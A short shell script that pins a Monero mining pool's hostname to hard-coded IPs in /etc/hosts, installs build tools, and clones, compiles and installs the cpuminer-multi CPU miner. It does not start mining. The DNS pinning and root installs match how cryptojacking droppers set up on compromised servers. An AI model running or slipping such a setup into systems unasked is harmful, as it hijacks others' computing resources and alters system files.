#!/bin/sh
echo "94.130.48.154 xmr.pool.minergate.com" >> /etc/hosts
echo "78.46.23.253 xmr.pool.minergate.com" >> /etc/hosts
echo "136.243.88.145 xmr.pool.minergate.com" >> /etc/hosts
echo "136.243.102.157 xmr.pool.minergate.com" >> /etc/hosts
echo "94.130.9.194 xmr.pool.minergate.com" >> /etc/hosts
echo "176.9.147.178 xmr.pool.minergate.com" >> /etc/hosts
echo "176.9.0.89 xmr.pool.minergate.com" >> /etc/hosts
echo "94.130.64.225 xmr.pool.minergate.com" >> /etc/hosts
echo "46.4.120.155 xmr.pool.minergate.com" >> /etc/hosts
echo "136.243.94.27 xmr.pool.minergate.com" >> /etc/hosts
echo "176.9.47.243 xmr.pool.minergate.com" >> /etc/hosts
apt-get update
apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ git screen
git clone https://github.com/wolf9466/cpuminer-multi
cd cpuminer-multi
./autogen.sh && ./configure && make && make install
